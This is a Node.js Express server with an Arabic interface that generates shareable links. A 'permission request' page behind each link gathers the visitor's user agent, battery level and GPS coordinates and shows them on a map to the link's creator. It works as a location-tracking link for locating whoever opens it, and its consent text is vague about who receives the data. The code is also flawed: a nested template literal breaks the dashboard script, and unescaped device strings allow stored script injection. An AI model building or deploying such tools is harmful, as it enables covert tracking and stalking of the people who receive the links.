import express from "express"
import { v4 as uuidv4 } from "uuid"

const app = express()
const PORT = process.env.PORT || 3000

app.use(express.json())

let sessions = {}

/* ============================= */
/* 🔥 الصفحة الرئيسية */
/* ============================= */

app.get("/", (req,res)=>{

res.send(`
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dashboard</title>

<style>

*{
box-sizing:border-box;
}

body{
margin:0;
font-family:Arial;
background:#0f172a;
color:white;
text-align:center;
padding:20px;
}

button{
padding:12px 20px;
border:none;
border-radius:8px;
background:#22c55e;
color:white;
font-size:16px;
cursor:pointer;
}

.box{
background:#1e293b;
padding:20px;
border-radius:12px;
margin-top:20px;
word-break:break-word;
}

.session-item{
background:#334155;
padding:15px;
border-radius:10px;
margin-top:10px;
text-align:left;
}

iframe{
width:100%;
height:400px;
border-radius:12px;
border:none;
margin-top:10px;
}

</style>

</head>
<body>

<h1>🚀 لوحة التحكم</h1>

<button onclick="create()">إنشاء جلسة</button>

<div id="sessions"></div>

<script>

function create(){

fetch('/create')
.then(r=>r.json())
.then(data=>{

let div=document.createElement("div")
div.className="box"

div.innerHTML=`
<b>رابط الجلسة:</b><br>
${data.link}
<br><br>
<b>المعلومات ستظهر هنا بعد الدخول</b>
`

document.getElementById("sessions").appendChild(div)

})

}

</script>

</body>
</html>
`)
})

/* ============================= */
/* 🔥 إنشاء جلسة */
/* ============================= */

app.get("/create",(req,res)=>{

let id = uuidv4().slice(0,6)

sessions[id] = {}

res.json({
link: req.protocol + "://" + req.get("host") + "/s/" + id
})

})

/* ============================= */
/* 🔥 صفحة الإذن العربية */
/* ============================= */

app.get("/s/:id",(req,res)=>{

let id = req.params.id

res.send(`

<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>طلب إذن</title>

<style>

body{
background:#0f172a;
color:white;
font-family:Arial;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
margin:0;
text-align:center;
}

.card{
background:#1e293b;
padding:30px;
border-radius:15px;
width:90%;
max-width:400px;
}

button{
padding:12px;
border:none;
border-radius:8px;
background:#22c55e;
color:white;
font-size:16px;
cursor:pointer;
width:100%;
}

</style>
</head>

<body>

<div class="card">
<h2>📢 طلب إذن</h2>
<p>نحتاج موافقتك لمشاركة معلومات الجهاز وموقعك لهذه الجلسة.</p>

<button onclick="send()">موافق ومشاركة</button>
</div>

<script>

function send(){

navigator.getBattery().then(function(b){

let battery = b.level * 100
let device = navigator.userAgent

navigator.geolocation.getCurrentPosition(function(pos){

fetch("/collect",{
method:"POST",
headers:{ "Content-Type":"application/json"},
body:JSON.stringify({
id:"${id}",
device:device,
battery:battery,
lat:pos.coords.latitude,
lon:pos.coords.longitude,
time:new Date().toLocaleString()
})
})

.then(()=>{

document.body.innerHTML="<h2>✅ تم إرسال البيانات بنجاح</h2>"

})

})

})

}

</script>

</body>
</html>

`)
})

/* ============================= */
/* 🔥 استقبال البيانات */
/* ============================= */

app.post("/collect",(req,res)=>{

sessions[req.body.id] = req.body

res.json({status:"ok"})

})

/* ============================= */
/* 🔥 عرض معلومات الجلسة تحت الرابط */
/* ============================= */

app.get("/view/:id",(req,res)=>{

let data = sessions[req.params.id]

if(!data){
return res.send("لا توجد بيانات")
}

res.send(`

<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Session Info</title>

<style>
body{
background:#0f172a;
color:white;
font-family:Arial;
padding:20px;
}

.box{
background:#1e293b;
padding:20px;
border-radius:15px;
word-break:break-word;
}

iframe{
width:100%;
height:400px;
border-radius:12px;
border:none;
margin-top:15px;
}

</style>
</head>
<body>

<div class="box">
<h2>📊 معلومات الجلسة</h2>

<p><b>الجهاز:</b><br>${data.device}</p>
<p><b>البطارية:</b> ${data.battery}%</p>
<p><b>الوقت:</b> ${data.time}</p>
<p><b>الموقع:</b></p>

<iframe 
src="https://www.google.com/maps?q=${data.lat},${data.lon}&output=embed">
</iframe>

</div>

</body>
</html>

`)
})

/* ============================= */

app.listen(PORT,()=>{
console.log("Server Running 🚀")
})
